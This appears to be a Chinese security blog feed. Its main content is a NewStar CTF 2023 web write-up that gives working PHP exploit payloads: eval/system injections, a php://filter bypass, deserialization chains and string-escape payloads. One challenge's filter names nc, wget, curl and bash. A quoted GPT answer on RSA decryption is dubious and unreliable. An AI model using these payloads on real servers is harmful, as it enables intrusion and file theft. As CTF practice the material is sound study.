Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c = <span class="number">9834481633369584189157728591978435618337259149694081678309646658277058618867</span></span><br><span class="line">p = <span class="number">332105137874944395742297540023188374897</span></span><br><span class="line">q = <span class="number">68159029643028420042825342940314147679</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">L = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,L)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line">flag = long_to_bytes(m+n)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>当时疑惑的点是m是最终解密的明文，为什么还要加n</p><p>GPT给出回答是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">至于为什么最后要加n的问题，其实这是一个巧妙的解决方案。在某些情况下，由于数值的取整或者舍入等原因，可能会导致解密出来的明文m比实际的明文小一个n。为了恢复到正确的明文，我们可以尝试将解密出来的明文m加上n，来看是否能得到正确的结果。</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231225001055831.png" alt="image-20231225001055831"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RSA加密&quot;&gt;&lt;a href=&quot;#RSA加密&quot; class=&quot;headerlink&quot; title=&quot;RSA加密&quot;&gt;&lt;/a&gt;RSA加密&lt;/h1&gt;&lt;p&gt;RSA算法是现今使用最广泛的公钥密码算法。&lt;/p&gt;
&lt;p&gt;根据密钥使用方法，可以将密码分为对称加密和非对称加密&lt;/p</summary>
      
    
    
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>NewStar CTF 2023 部分wp(web)</title>
    <link href="http://example.com/2023/12/24/postNewStar-CTF-2023-%E9%83%A8%E5%88%86wp-web/"/>
    <id>http://example.com/2023/12/24/postNewStar-CTF-2023-%E9%83%A8%E5%88%86wp-web/</id>
    <published>2023-12-24T14:07:46.000Z</published>
    <updated>2023-12-25T16:15:31.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个比赛是在今年九月份举办的，当时没有做，临近年底发现环境还可以打开，尝试做一下。</p><h1 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了第四关都是数组绕过</p><p>第四关key5&#x3D;2024a</p><p>PHP的对字符串的转换规则是：若字符串以数字开头，则最终的转化结果为开头的数字，否则为0</p><p><img src="/../images/image-20231222222936771.png" alt="image-20231222222936771"></p><h1 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码审计：</p><p>post传参password和e_v.a.l，变量password&#x3D;md5加密后的password，变量code&#x3D;e_v.a.l，如果md5加密后的password前六位等于c4d038，则对code进行代码执行</p><p>但是这里有个坑，…会被解析成_,但是php8.0前的版本[会被解析成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_</span><br></pre></td></tr></table></figure><p>可以利用这一点传参e_v.a.l</p><p>最终payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=114514&amp;e[v.a.l=eval($_POST[1]);&amp;1=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231222224001837.png" alt="image-20231222224001837"></p><h1 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用<em>php:&#x2F;&#x2F;filter</em>&#x2F;convert.base64-decode&#x2F;resource来读取的话会触发正则</p><p>可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF-8.UTF-7/resource=flag.php</span><br></pre></td></tr></table></figure><p>来绕过</p><p><img src="/../images/image-20231222225613086.png" alt="image-20231222225613086"></p><p>转换成flag形式就行</p><h1 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h1><p>上sqlmap</p><p><img src="/../images/image-20231223093929852.png" alt="image-20231223093929852"></p><h1 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h1><p>扫描.git泄露</p><p><img src="/../images/image-20231223094736942.png" alt="image-20231223094736942"></p><p>上Githack</p><p><img src="/../images/image-20231223094753746.png" alt="image-20231223094753746"></p><p>得到bo0g1pop.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个正则对提交的参数进行处理，任意字符加上可选的括号替换为空，然后判断是否等于分号</p><p>第二个正则 过滤了一些常用的无参数命令执行的php方法</p><p>这里借鉴大佬的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1</span><br><span class="line">Host: ad6b5617-a7e0-4a81-ba4b-cef495cf765e.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarder-Proto: system(&#x27;cat /f*&#x27;);</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231223095853820.png" alt="image-20231223095853820"></p><p><strong>getallheaders()返回所有http头信息，但返回的信息是数组</strong></p><p><strong>array_reverse()将数组反转</strong></p><p><strong>pos()输出数组元素的值</strong></p><h1 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>简单的反序列化和命令执行</p><p>需要触发__toString()方法，那么就需要把对象当字符串调用</p><p>而触发__destruct()方法就会把$qwejaskdjnlka当作字符串输出</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /f* | t&#x27;&#x27;ee b&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>= <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>(); <span class="comment">//调用两次</span></span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231225234148208.png" alt="image-20231225234148208"></p><h1 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure><p>字符串增多逃逸，一个bad替换为一个good，一对一</p><p>构造链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;N;s:3:&quot;cmd&quot;;s:7:&quot;cat /f*&quot;;&#125;</span><br></pre></td></tr></table></figure><p>而我们需要逃逸的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;cmd&quot;;s:7:&quot;cat /f*&quot;;&#125;</span><br></pre></td></tr></table></figure><p>共27个字符，那么只需要写27个bad</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:7:&quot;cat /f*&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231226001220863.png" alt="image-20231226001220863"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这个比赛是在今年九月份举办的，当时没有做，临近年底发现环境还可以打开，尝试做一下。&lt;/p&gt;
&lt;h1 id=&quot;Begin-of-PHP&quot;&gt;&lt;a</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>从一道题学习LFI包含pearcmd命令执行</title>
    <link href="http://example.com/2023/12/23/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0LFI%E5%8C%85%E5%90%ABpearcmd%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2023/12/23/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0LFI%E5%8C%85%E5%90%ABpearcmd%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-12-23T08:17:06.000Z</published>
    <updated>2023-12-23T09:01:04.860Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pear"><a href="#pear" class="headerlink" title="pear"></a>pear</h1><p>pear全称PHP Extension and Application Reposition(php扩展和应用仓库)，在docker中默认安装，路径为&#x2F;usr&#x2F;loacl&#x2F;lib&#x2F;php</p><p>register_argc_argv为On时，$_SERVER[‘argv’]和$_SERVER[‘argc’]会记录一些东西。在web中，传参时使用+连接的值的个数就是argc，各个参数被存到argv里。</p><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argc&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>0.php?a&#x3D;a</p><p><img src="/../images/image-20231223164158153.png" alt="image-20231223164158153"></p><p>0.php?a&#x3D;a+b+c</p><p><img src="/../images/image-20231223164214690.png" alt="image-20231223164214690"></p><p>这里是根据+做分隔符来判断。</p><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><p>目标装了pear组件，register_argc_argv为On，可以包含到pearcmd.php文件(不受open_basedir和文件后缀限制)</p><h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>当文件包含了pearcmd.php时就会执行$_SERVER[‘argv’]中的命令</p><h1 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h1><p>打开环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span 